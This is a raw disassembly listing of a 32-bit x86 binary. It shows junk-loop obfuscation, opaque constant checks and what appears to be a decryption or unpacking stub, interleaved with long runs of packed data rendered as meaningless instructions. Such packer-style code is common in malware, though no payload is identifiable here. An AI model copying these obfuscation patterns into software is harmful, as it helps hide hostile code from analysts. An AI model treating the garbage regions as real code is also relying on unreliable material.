  407bc1:	xor    edx,DWORD PTR ds:0x433857
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x4337d7,0x11
  407bd9:	cmp    DWORD PTR ds:0x4337d7,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x4337d7,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x4337d7,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x4337d7
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x4337d7,edx
  407c1f:	mov    edx,DWORD PTR ds:0x4337d7
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x4337d7,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	xlat   BYTE PTR ds:[ebx]
  407c4b:	dec    esp
  407c4c:	cli    
  407c4d:	adc    ch,BYTE PTR [ebx]
  407c4f:	int3   
  407c50:	jle    0x407cd0
  407c52:	add    eax,0x827e7e7c
  407c57:	fimul  WORD PTR [ecx-0x71cae974]
  407c5d:	aad    0xe2
  407c5f:	sub    ebp,DWORD PTR [eax-0x3deccc2b]
  407c65:	mov    dl,0xe2
  407c67:	lds    ebp,FWORD PTR [esi+ecx*1+0x6a]
  407c6b:	test   al,0x3
  407c6d:	data16 stc 
  407c6f:	adc    bh,BYTE PTR [eax-0x7b106d47]
  407c75:	retf   
  407c76:	dec    ebp
  407c77:	xor    DWORD PTR [ecx+0xb5b958],edx
  407c7d:	scas   eax,DWORD PTR es:[edi]
  407c7e:	push   edi
  407c7f:	gs (bad) 
  407c81:	fsubr  st(7),st
  407c83:	jecxz  0x407c2f
  407c85:	rol    dl,cl
  407c87:	jbe    0x407c90
  407c89:	test   BYTE PTR [edx-0x73],ah
  407c8c:	shl    BYTE PTR [eax+0x36c3096f],cl
  407c92:	pop    esp
  407c93:	and    esi,DWORD PTR [ebx+0x6456c90a]
  407c99:	into   
  407c9a:	or     eax,0x522d142
  407c9f:	push   eax
  407ca0:	call   0x9a07:0x1b012a6
  407ca7:	neg    BYTE PTR [ebx+ebp*4-0x29]
  407cab:	cmp    BYTE PTR [eax-0x6f],ah
  407cae:	xchg   edi,eax
  407caf:	mov    cl,BYTE PTR [edx]
  407cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cb2:	sbb    DWORD PTR [ebx+0x246bb75a],ebx
  407cb8:	js     0x407cee
  407cba:	and    al,0x6c
  407cbc:	inc    ebx
  407cbd:	gs jg  0x407cd6
  407cc0:	mov    esi,ss
  407cc2:	cmp    BYTE PTR [ecx-0x72d609ee],ah
  407cc8:	jbe    0x407d0f
  407cca:	adc    DWORD PTR [edi],esi
  407ccc:	jae    0x407ce5
  407cce:	stos   DWORD PTR es:[edi],eax
  407ccf:	dec    ebx
  407cd0:	ret    0x19f8
  407cd3:	repnz leave 
  407cd5:	pop    ebx
  407cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cd7:	mov    al,ds:0x8fc6f2e6
  407cdc:	js     0x407c6c
  407cde:	(bad)  
  407cdf:	rcr    BYTE PTR [edi+0x388a219d],1
  407ce5:	adc    BYTE PTR [eax-0x3a],0x17
  407ce9:	scas   eax,DWORD PTR es:[edi]
  407cea:	(bad)
  407cee:	loopne 0x407c86
  407cf0:	into   
  407cf1:	push   ecx
  407cf2:	test   BYTE PTR [ecx-0x61],cl
  407cf5:	repz gs jge 0x407c93
  407cf9:	pop    ecx
  407cfa:	aam    0xb8
  407cfc:	add    cl,BYTE PTR [eax-0x4c]
  407cff:	pop    ebx
  407d00:	mov    ch,dl
  407d02:	dec    edx
  407d03:	xchg   esp,eax
  407d04:	js     0x407cf8
  407d06:	ins    DWORD PTR es:[edi],dx
  407d07:	push   ss
  407d08:	and    eax,0xb52ab9c0
  407d0d:	inc    esp
  407d0e:	xchg   edx,eax
  407d0f:	adc    DWORD PTR [ecx],ecx
  407d11:	cmp    BYTE PTR [ebx+0x58abd9a1],dl
  407d17:	retf   
  407d18:	xchg   esi,eax
  407d19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d1a:	mov    cl,0x5d
  407d1c:	mov    bh,0x19
  407d1e:	push   cs
  407d1f:	sub    DWORD PTR [esp+eax*2+0x4f],ecx
  407d23:	mov    al,0x26
  407d25:	sbb    eax,0xb721eab1
  407d2a:	add    al,0x26
  407d2c:	inc    eax
  407d2d:	jo     0x407cbc
  407d2f:	shl    esp,cl
  407d31:	fmulp  st(4),st
  407d33:	pop    edx
  407d34:	mov    cl,0x98
  407d36:	mov    BYTE PTR [ebx],ah
  407d38:	sub    eax,0x2954aaf5
  407d3d:	dec    edi
  407d3e:	push   ecx
  407d3f:	lds    ebx,FWORD PTR [edx-0x38cf0d13]
  407d45:	xor    BYTE PTR [eax+0x1f],ch
  407d48:	outs   dx,DWORD PTR ds:[esi]
  407d49:	ret    
  407d4a:	(bad)  
  407d4b:	mov    ds:0x724eba83,al
  407d50:	in     al,0x6f
  407d52:	jg     0x407cff
  407d54:	or     ch,BYTE PTR [esi]
  407d56:	retf   
  407d57:	dec    eax
  407d58:	mov    DWORD PTR [ebx-0x7f43eb96],esi
  407d5e:	jle    0x407d0f
  407d60:	xor    cl,BYTE PTR [ebx]
  407d62:	or     DWORD PTR [edx+ecx*2-0x9b1702a],0xffffff9d
  407d6a:	arpl   WORD PTR [edi+0x23],cx
  407d6d:	fs pushf 
  407d6f:	bound  ebp,QWORD PTR [edi+0x14]
  407d72:	pop    eax
  407d73:	(bad)  [esi+0x70]
  407d76:	into   
  407d77:	xchg   edx,eax
  407d78:	call   0x736d83a0
  407d7d:	adc    DWORD PTR [ecx],0xd5fc5d5c
  407d83:	scas   eax,DWORD PTR es:[edi]
  407d84:	out    0x52,eax
  407d86:	mov    ds:0xb3a61bc,eax
  407d8b:	adc    DWORD PTR [edi],esi
  407d8d:	dec    edi
  407d8e:	fistp  WORD PTR [eax]
  407d90:	xchg   cx,ax
  407d92:	mov    dh,0xd8
  407d94:	xchg   esi,eax
  407d95:	jmp    0x39ff:0xb4a5395d
  407d9c:	jbe    0x407d21
  407d9e:	push   cs
  407d9f:	test   BYTE PTR [ebp-0x49],al
  407da2:	shr    DWORD PTR [ebx],cl
  407da4:	fistp  WORD PTR [edx+0x13876cda]
  407daa:	jb     0x407d47
  407dac:	jo     0x407e12
  407dae:	in     eax,dx
  407daf:	inc    ebx
  407db0:	sar    BYTE PTR [ebx+ebx*4+0xd],1
  407db4:	test   BYTE PTR [ecx],0x6
  407db7:	xor    ecx,esi
  407db9:	and    edx,ecx
  407dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dbc:	dec    DWORD PTR [ecx-0xe]
  407dbf:	hlt    
  407dc0:	jbe    0x407dbe
  407dc2:	lods   eax,DWORD PTR ds:[esi]
  407dc3:	aaa    
  407dc4:	cmp    dl,BYTE PTR [edx]
  407dc6:	sahf   
  407dc7:	xor    al,0x4
  407dc9:	or     DWORD PTR [edx+edx*8+0x7],edi
  407dcd:	hlt    
  407dce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dd0:	push   eax
  407dd1:	cmp    BYTE PTR [ebx-0x4a],0x8c
  407dd5:	imul   eax,edx,0xffffff86
  407dd8:	out    dx,eax
  407dd9:	jb     0x407d9a
  407ddb:	hlt    
  407ddc:	call   0x1093:0x6115e953
  407de3:	into   
  407de4:	sar    DWORD PTR [ebx],1
  407de6:	fnstcw WORD PTR [ebp-0x7433cc05]
  407dec:	out    dx,al
  407ded:	imul   ebx,ebp,0x35
  407df0:	xlat   BYTE PTR ds:[ebx]
  407df1:	xchg   BYTE PTR [ebx-0x41],bl
  407df4:	and    edi,DWORD PTR [eax+edi*1-0x6]
  407df8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407df9:	cli    
  407dfa:	enter  0xe609,0x9e
  407dfe:	cmp    esi,DWORD PTR [ebx+0x7b]
  407e01:	xor    eax,0xe2858171
  407e06:	outs   dx,BYTE PTR ds:[esi]
  407e07:	in     eax,dx
  407e08:	retf   
  407e09:	mov    eax,ds:0x6ebf2047
  407e0e:	sar    BYTE PTR [esi],cl
  407e10:	dec    eax
  407e11:	popf   
  407e12:	ja     0x407e1b
  407e14:	pushf  
  407e15:	imul   edi,DWORD PTR [eax+0x78f55d26],0x3a
  407e1c:	(bad)  
  407e1d:	std    
  407e1e:	add    al,0x4a
  407e20:	mov    ebp,0x6327e4b
  407e25:	push   esp
  407e26:	push   ecx
  407e27:	and    dl,BYTE PTR [esi]
  407e29:	xor    al,0xcc
  407e2b:	mov    BYTE PTR [edi+0x74800ee8],0xa9
  407e32:	push   esi
  407e33:	xor    DWORD PTR [ebp+0x486d68bc],edi
  407e39:	mov    BYTE PTR [edi-0x2d],bh
  407e3c:	mov    esi,0x8b1c4559
  407e41:	or     al,0xb
  407e43:	daa    
  407e44:	push   ecx
  407e45:	pushf  
  407e46:	or     BYTE PTR [ebp+0x3d2d2a34],cl
  407e4c:	sbb    eax,0xab1a29b6
  407e51:	xor    BYTE PTR [ebp+eax*1+0x11],dh
  407e55:	into   
  407e56:	push   es
  407e57:	mov    ah,0x33
  407e59:	sbb    DWORD PTR ds:0x10f88394,edx
  407e5f:	jecxz  0x407e9c
  407e61:	mov    DWORD PTR [eax],edx
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x4337eb
  407f81:	or     DWORD PTR ds:0x4337ef,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x433857,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x433853,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43389b
  407fad:	sub    DWORD PTR ds:0x433827,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x4337db
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x43382b,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x43382b
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x43382b,ebx
  407fdd:	cmp    DWORD PTR ds:0x43382b,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x43382b,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x433a67
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x43382b,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x43382b
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x43382b,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x43382b,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x43382b
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x43382b,ebx
  408048:	cmp    DWORD PTR ds:0x43382b,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x43382b,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x43382b,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x43382b
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x43382b,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x43377b,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x43385b
  4080b1:	and    DWORD PTR ds:0x433863,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43381b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x4338a3,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x4338a3
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x4338a3,ebx
  4080e3:	cmp    DWORD PTR ds:0x4338a3,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x43385b
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x4338a3,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x4338a3
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x4338a3,ebx
  40811d:	cmp    DWORD PTR ds:0x4338a3,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433897,0x1f
  40813b:	cmp    DWORD PTR ds:0x433897,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433897,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433897
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433897,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x539a830d
  408191:	out    dx,al
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	js     0x408189
  40819c:	lods   eax,DWORD PTR ds:[esi]
  40819d:	outs   dx,BYTE PTR ds:[esi]
  40819e:	mov    bl,al
  4081a0:	dec    DWORD PTR [ebx]
  4081a2:	xor    DWORD PTR [esi-0x4849ed85],0x3b
  4081a9:	out    0x59,eax
  4081ab:	popf   
  4081ac:	inc    ecx
  4081ad:	adc    dh,BYTE PTR [esi-0xd50740e]
  4081b3:	stos   DWORD PTR es:[edi],eax
  4081b4:	dec    ecx
  4081b5:	inc    ecx
  4081b6:	mov    al,0xb4
  4081b8:	(bad)  
  4081b9:	jmp    0x4081e4
  4081bb:	pusha  
  4081bc:	jmp    0x4081d2
  4081be:	mov    al,dl
  4081c0:	inc    eax
  4081c1:	aas    
  4081c2:	pop    ecx
  4081c3:	push   eax
  4081c4:	mov    ebp,0x2dfa9ac
  4081c9:	ss ins DWORD PTR es:[edi],dx
  4081cb:	sbb    al,0xa4
  4081cd:	mov    eax,ds:0xf80e1bcb
  4081d2:	xor    DWORD PTR [ebx+0x9],ebx
  4081d5:	sahf   
  4081d6:	test   BYTE PTR [ebp+0x43],dh
  4081d9:	lods   al,BYTE PTR ds:[esi]
  4081da:	and    BYTE PTR ds:0xceb8bb46,bl
  4081e0:	cmp    al,0x47
  4081e2:	mov    bh,0xd2
  4081e4:	pop    esi
  4081e5:	mov    bl,0x92
  4081e7:	(bad)  
  4081e8:	lea    edi,[esi+0x39]
  4081eb:	add    eax,0x26122718
  4081f0:	sub    BYTE PTR [edi+0x7d2a31f7],bh
  4081f6:	or     DWORD PTR [ecx],ecx
  4081f8:	adc    bh,BYTE PTR [ebx+0x88dcf03]
  4081fe:	inc    DWORD PTR [eax-0x7eee464e]
  408204:	shr    BYTE PTR [edi-0x650b4a81],0xc7
  40820b:	cpuid  
  40820d:	lods   al,BYTE PTR ds:[esi]
  40820e:	dec    esi
  40820f:	or     DWORD PTR [edx],edi
  408211:	cmp    al,0xe5
  408213:	and    DWORD PTR [edx-0x39],esi
  408216:	lods   eax,DWORD PTR ds:[esi]
  408217:	push   ecx
  408218:	sbb    esi,edx
  40821a:	cmp    BYTE PTR [edi],0x82
  40821d:	ret    0x9c05
  408220:	(bad)  
  408221:	je     0x408279
  408223:	fidivr WORD PTR ds:0x9e8a756b
  408229:	ins    DWORD PTR es:[edi],dx
  40822a:	fidiv  DWORD PTR [edi-0x40eaf013]
  408230:	ins    DWORD PTR es:[edi],dx
  408231:	ret    0x4cc2
  408234:	dec    ebx
  408235:	out    0xe4,eax
  408237:	cld    
  408238:	mov    ds:0x8ebb4a3e,al
  40823d:	mov    ebx,DWORD PTR [eax+0x13]
  408240:	cmp    ebp,DWORD PTR [eax-0x6e57c582]
  408246:	push   ebx
  408247:	jle    0x4081e2
  408249:	mov    esp,edx
  40824b:	cld    
  40824c:	sub    edx,DWORD PTR [ebp+esi*4-0x27]
  408250:	(bad)  
  408251:	pop    ecx
  408252:	scas   al,BYTE PTR es:[edi]
  408253:	retf   
  408254:	sub    BYTE PTR [ebx],0x3c
  408257:	loope  0x408237
  408259:	ret    
  40825a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40825b:	mov    bh,0x49
  40825d:	call   0xf437:0xcf935161
  408264:	clc    
  408265:	out    dx,al
  408266:	js     0x5612b898
  40826c:	jo     0x408252
  40826e:	ins    DWORD PTR es:[edi],dx
  40826f:	fucomi st,st(3)
  408271:	push   ds
  408272:	or     DWORD PTR [esp+0x3cefccc7],esp
  408279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40827a:	(bad)
  40827d:	in     eax,0x8f
  40827f:	push   ss
  408280:	inc    eax
  408281:	jl     0x40820e
  408283:	sub    DWORD PTR [eax+0x6920e6aa],edi
  408289:	(bad)  
  40828a:	pushf  
  40828b:	in     al,dx
  40828c:	cmp    BYTE PTR [esi],bl
  40828e:	in     eax,dx
  40828f:	fnstcw WORD PTR [edi+0x1b6ac8e3]
  408295:	nop
  408296:	nop
  408297:	ret    0x805c
  40829a:	loopne 0x408278
  40829c:	ins    DWORD PTR es:[edi],dx
  40829d:	sahf   
  40829e:	jecxz  0x40828e
  4082a0:	add    BYTE PTR [edx+0x27],cl
  4082a3:	cs mov es,edi
  4082a6:	leave  
  4082a7:	mov    eax,DWORD PTR [eax]
  4082a9:	mul    DWORD PTR [ebp+0x1c]
  4082ac:	push   ebp
  4082ad:	(bad)  
  4082ae:	fnstenv [ecx-0x6d0244ba]
  4082b4:	mov    ds,WORD PTR [esi+0x6a]
  4082b7:	xchg   edx,eax
  4082b8:	jecxz  0x40823e
  4082ba:	dec    ecx
  4082bb:	mov    ds:0x43a2d287,al
  4082c0:	push   ecx
  4082c1:	pop    ebp
  4082c2:	mov    dl,0x22
  4082c4:	daa    
  4082c5:	in     al,0xc7
  4082c7:	or     eax,0x428172a2
  4082cc:	dec    esp
  4082cd:	or     al,0x6f
  4082cf:	add    DWORD PTR [ecx],0x530c1070
  4082d5:	int3   
  4082d6:	aas    
  4082d7:	cdq    
  4082d8:	xor    dl,BYTE PTR [edi]
  4082da:	scas   al,BYTE PTR es:[edi]
  4082db:	adc    eax,0xab567560
  4082e0:	xchg   ebp,eax
  4082e1:	inc    esp
  4082e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082e3:	int3   
  4082e4:	mov    al,0xee
  4082e6:	jb     0x40830b
  4082e8:	pop    es
  4082e9:	adc    eax,0x63b2ae21
  4082ee:	mov    ecx,0x274be56e
  4082f3:	fisub  DWORD PTR [ecx+0x6e]
  4082f6:	imul   edi,DWORD PTR ds:0x284f0814,0x5d8b3dfc
  408300:	adc    eax,0x6a838cb
  408305:	jmp    0xa44a:0xc30b583b
  40830c:	ud2    
  40830e:	sub    BYTE PTR [ebp+0x53],0x87
  408312:	pop    ebx
  408313:	stc    
  408314:	call   0xa8c9314d
  408319:	outs   dx,BYTE PTR ds:[esi]
  40831a:	ins    BYTE PTR es:[edi],dx
  40831b:	lods   eax,DWORD PTR ds:[esi]
  40831c:	cdq    
  40831d:	out    0x5c,al
  40831f:	sub    BYTE PTR [edi-0x3b21032b],dh
  408325:	lods   al,BYTE PTR ds:[esi]
  408326:	je     0x4082f1
  408328:	push   esp
  408329:	push   edx
  40832a:	mov    esp,0xdf03e26b
  40832f:	jmp    0x4a0ab011
  408334:	mov    edx,0x377c02a9
  408339:	sub    edi,0x71
  40833c:	mov    bh,0x51
  40833e:	mov    ecx,0x2ded90d
  408343:	outs   dx,DWORD PTR ds:[esi]
  408344:	mov    ebx,0xd15d8839
  408349:	mov    al,0x77
  40834b:	je     0x4083c7
  40834d:	or     eax,0x896af31b
  408352:	sub    al,0xad
  408354:	mov    dl,0x77
  408356:	scas   al,BYTE PTR es:[edi]
  408357:	cli    
  408358:	or     DWORD PTR fs:[ebp-0x7c],0x4d60e7d5
  408360:	cmp    ah,BYTE PTR [ebx]
  408362:	mov    ds:0xf5e9f53d,eax
  408367:	or     ebx,DWORD PTR [ecx+0x5c]
  40836a:	(bad)  
  40836c:	xor    al,al
  40836e:	in     al,dx
  40836f:	dec    eax
  408370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408371:	fcomp  QWORD PTR [ebp+0x50]
  408374:	fiadd  DWORD PTR [ecx-0xd]
  408377:	rcr    BYTE PTR [esi-0x3d],1
  40837a:	xlat   BYTE PTR ds:[ebx]
  40837b:	jle    0x408313
  40837d:	lds    ecx,FWORD PTR [edx+0x1a]
  408380:	fcomip st,st(3)
  408382:	int    0x80
  408384:	out    dx,eax
  408385:	sbb    eax,0x80bb113
  40838a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40838b:	cmp    eax,0xaacda04
  408390:	lods   eax,DWORD PTR ds:[esi]
  408391:	and    eax,0x37033d07
  408396:	xor    al,0xf8
  408398:	push   edi
  408399:	je     0x4083ce
  40839b:	mov    ecx,0xcad850f2
  4083a0:	(bad)  
  4083a1:	and    dl,BYTE PTR [esi+0x58]
  4083a4:	cmp    BYTE PTR [eax],0xfb
  4083a7:	lods   eax,DWORD PTR ds:[esi]
  4083a8:	test   eax,0xa5844b93
  4083ad:	fistp  DWORD PTR [ebp-0x5]
  4083b0:	xchg   DWORD PTR [ecx+0x33],edx
  4083b3:	mov    esp,0x54ac7e93
  4083b8:	in     al,dx
  4083b9:	imul   esp,DWORD PTR [edx+edi*8],0x2f
  4083bd:	pop    edx
  4083be:	lahf   
  4083bf:	scas   al,BYTE PTR es:[edi]
  4083c0:	jb     0x4083ab
  4083c2:	push   ss
  4083c3:	clc    
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x4337db,0x0
  4083d1:	mov    eax,ds:0x4337db
  4083d6:	inc    eax
  4083d7:	mov    ds:0x4337db,eax
  4083dc:	cmp    DWORD PTR ds:0x4337db,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x4337db,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x4337db
  40840c:	inc    eax
  40840d:	mov    ds:0x4337db,eax
  408412:	cmp    DWORD PTR ds:0x4337db,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43378b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433793,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x4338a7
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	xchg   ecx,eax
  408465:	mov    ecx,0xc8e454e1
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	lds    eax,FWORD PTR [edi-0x31de61f1]
  408476:	test   DWORD PTR [edi+0x1f7e7ee1],eax
  40847c:	scas   al,BYTE PTR es:[edi]
  40847d:	repz and BYTE PTR [edi-0x7c],ch
  408481:	or     al,0x3d
  408483:	push   0xb8bde19a
  408488:	inc    edx
  408489:	(bad)  
  40848a:	out    dx,eax
  40848b:	mov    al,0x75
  40848d:	cs xor al,0xf0
  408490:	dec    edi
  408491:	inc    edx
  408492:	(bad)  
  408493:	cmc    
  408494:	fidiv  WORD PTR ds:0x8357d6d8
  40849a:	leave  
  40849b:	jp     0x40850c
  40849d:	adc    dl,BYTE PTR [ecx+0x73]
  4084a0:	xchg   BYTE PTR [edx-0x72183866],bh
  4084a6:	push   ebx
  4084a7:	cdq    
  4084a8:	mov    ah,0xec
  4084aa:	lea    eax,[edx+eiz*8]
  4084ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084ae:	lahf   
  4084af:	mov    al,BYTE PTR [eax-0x43]
  4084b2:	jmp    0x8a874680
  4084b7:	repnz inc ecx
  4084b9:	stos   BYTE PTR es:[edi],al
  4084ba:	push   ds
  4084bb:	xchg   DWORD PTR [eax+0x423fbde7],eax
  4084c1:	dec    ecx
